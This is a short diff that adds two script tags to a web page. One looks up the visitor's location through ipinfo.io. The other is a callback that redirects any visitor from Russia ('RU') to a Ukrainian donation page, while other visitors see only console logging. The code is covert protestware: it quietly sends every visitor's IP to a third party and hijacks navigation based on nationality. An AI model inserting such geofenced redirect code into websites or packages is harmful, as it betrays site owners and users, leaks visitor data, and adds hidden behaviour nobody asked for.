@@ -1,0 +1,13 @@
+<script>
+    function recordData (data) {
+        let putin = "RU";
+        country = data.country;
+        console.log(country);
+        if (country === putin) {
+            window.location.replace("https://savelife.in.ua/en/donate/");
+        } else {
+            console.log('russian check passed')
+        }
+    }
+  </script>
+  <script src="https://ipinfo.io/json?callback=recordData"></script>
